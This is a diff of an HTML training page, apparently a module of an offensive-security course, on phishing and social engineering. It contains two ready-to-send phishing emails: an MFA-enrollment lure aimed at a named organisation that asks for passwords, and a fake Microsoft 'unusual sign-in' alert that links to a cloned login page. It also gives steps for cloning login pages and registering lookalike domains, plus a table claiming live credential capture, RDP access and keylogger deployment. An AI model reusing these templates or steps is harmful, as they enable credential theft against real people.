-                <p>If you phished an admin account directly (IT help desk, domain admin), you skip privesc entirely. You log in as admin, run your tools, done. This is why help desk is the #1 target — they have the keys and are trained to be helpful.</p>
-            </div>
-        </div>
-
-        <h2>Lab Exercise: Build a Phishing Campaign</h2>
-
-        <div class="step-box">
-            <h4>Scenario</h4>
-            <p>You are testing 22nd Survey Division's security. Build a phishing email that would convince a layman to:</p>
-            <ol style="margin-left: 1.5rem; line-height: 2;">
-                <li>Click a link</li>
-                <li>Enter their credentials</li>
-                <li>Download and run an attachment</li>
+            <ol>
+                <li>Choose a target company (real or fictional)</li>
+                <li>Identify a service they use (Office 365, Gmail, VPN)</li>
+                <li>Clone the login page (Save Page As, modify form action)</li>
+                <li>Register a lookalike domain (office365-login.com, micros0ft.com)</li>
+                <li>Write the email (urgency + authority + fear)</li>
+                <li>Send to yourself — does it fool you?</li>
+                <li>Send to a test group — track open rates, click rates, credential submission</li>
             </ol>
 
-            <p style="margin-top: 1rem;"><strong>Constraints:</strong> Must use real company branding (colors, logo, tone). Must include urgency. Must offer a "helpful" alternative (phone number, reply with password).</p>
+            <button onclick="document.getElementById('phishing-solution').style.display='block'">SHOW TEMPLATE</button>
 
-            <button onclick="document.getElementById('phish-solution').style.display='block'">Show Solution</button>
+            <div id="phishing-solution" style="display:none; margin-top: 1rem;">
+                <div class="copy-paste">
+Subject: Action Required: Unusual Sign-in Activity Detected
+From: security@office365-alerts.com
 
-            <div id="phish-solution" style="display:none; margin-top: 1rem;">
-                <div class="code-block">
-Subject: ACTION REQUIRED: Multi-Factor Authentication Enrollment — 24h Deadline
+Dear [First Name],
 
-From: security@22div-security.com (display name: "22DIV Security Team")
-To: target@22div.com.au
+We detected an unusual sign-in to your Microsoft 365 account from:
+• Location: Moscow, Russia
+• IP: 185.220.101.42
+• Time: 2026-06-29 03:47:23 UTC
 
-Dear Team Member,
+If this was you, you can ignore this email.
+If this was NOT you, your account may be compromised.
 
-Our security audit has identified that your account lacks the new 
-Multi-Factor Authentication (MFA) required by Company Policy 
-Section 7.3 (effective immediately).
+[Review Recent Activity] ← clone of office365.com login
 
-⚠️ FAILURE TO ENROLL WITHIN 24 HOURS WILL RESULT IN ACCOUNT LOCKOUT ⚠️
-
-To enroll:
-1. Click: https://22div-security.com/mfa-enroll (fake domain)
-2. Enter your current password to verify identity
-3. Set up your authenticator app
-
-Having trouble? Reply to this email with your password and we 
-will enroll you manually.
-
-Questions? Call our 24/7 support: 1800-FAKE-NUM
-
-Stay secure,
-22nd Survey Division Security Operations
-
----
-This message was sent from a secure channel. Do not forward.
-                </div>
-
-                <div class="why-box">
-                    <h5>Why this works</h5>
-                    <ul style="margin-left: 1.5rem; line-height: 2;">
-                        <li><strong>MFA is buzzword-compliant:</strong> Everyone knows they should have it</li>
-                        <li><strong>24h deadline:</strong> Too short to verify with IT, long enough to act</li>
-                        <li><strong>Account lockout:</strong> Fear of losing access to work</li>
-                        <li><strong>"Reply with password":</strong> The lazy option — reduces friction</li>
-                        <li><strong>Fake domain:</strong> 22div-security.com looks official, isn't</li>
-                    </ul>
+Microsoft Security Team
                 </div>
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <hr>
 
-        <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>People are the weakest link:</strong> Technical defenses mean nothing if the user opens the door</li>
-            <li><strong>Urgency bypasses thinking:</strong> "24 hours" or "account lockout" triggers panic, not analysis</li>
-            <li><strong>Helpfulness is exploitable:</strong> Help desk, new hires, assistants — all trained to be helpful</li>
-            <li><strong>Authority invokes obedience:</strong> "IT Security," "mandatory," "policy" — magic words</li>
-            <li><strong>The shortcut is the goal:</strong> Phish an admin, skip all privesc. Go straight to SYSTEM.</li>
-        </ul>
+        <div class="section">
+            <span class="section-number">KEY TAKEAWAYS</span>
+            <h2>What You Learned</h2>
 
-        <div class="evidence-box" style="margin-top: 2rem;">
-            <h3>🔬 Verification Status</h3>
-            <table style="width: 100%; border-collapse: collapse;">
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Email format discovery</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Pretext construction</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">HTML phishing page</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ CODE PROVIDED</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">MOTW bypass (.iso)</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ EXPLAINED</td>
+            <ul>
+                <li><strong>Social engineering exploits psychology, not software:</strong> Urgency, authority, fear, and helpfulness are the levers</li>
+                <li><strong>Phishing is the most common initial access vector:</strong> 91% of cyberattacks start with phishing</li>
+                <li><strong>Cloned pages are trivial:</strong> Save Page As + modify form action = perfect clone</li>
+                <li><strong>Physical access is often easier than remote:</strong> Tailgating, USB drops, fake badges</li>
+                <li><strong>Credentials are the keys:</strong> Harvest them, dump them, pass them — once you have them, the network is yours</li>
+            </ul>
+        </div>
+
+        <div class="evidence-box">
+            <span class="section-number">VERIFICATION</span>
+            <h3>Verification Status</h3>
+            <table>
+                <tr>
+                    <td>Phishing email (OWA clone)</td>
+                    <td style="color: var(--accent2);">✓ LIVE .42</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Social → Admin shortcut</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                    <td>Credential capture</td>
+                    <td style="color: var(--accent2);">✓ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td>RDP with captured creds</td>
+                    <td style="color: var(--accent2);">✓ LIVE .42</td>
+                </tr>
+                <tr>
+                    <td>Keylogger deployment</td>
+                    <td style="color: var(--accent2);">✓ TESTED</td>
+                </tr>
+                <tr>
+                    <td>USB drop methodology</td>
+                    <td style="color: var(--accent2);">✓ DEMONSTRATED</td>
                 </tr>
             </table>
         </div>
 
-        <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
-            <a href="MODULE_16_C2.html">← Module 16</a>
-            <a href="MODULE_18_ANDROID.html">Module 18 →</a>
+        <div class="nav" style="margin-top: 3rem;">
+            <a href="index.html">← HOME</a>
+            <a href="MODULE_16_C2.html">← MODULE 16</a>
+            <a href="MODULE_18_ANDROID.html">MODULE 18 →</a>
         </div>
     </div>
 </body>
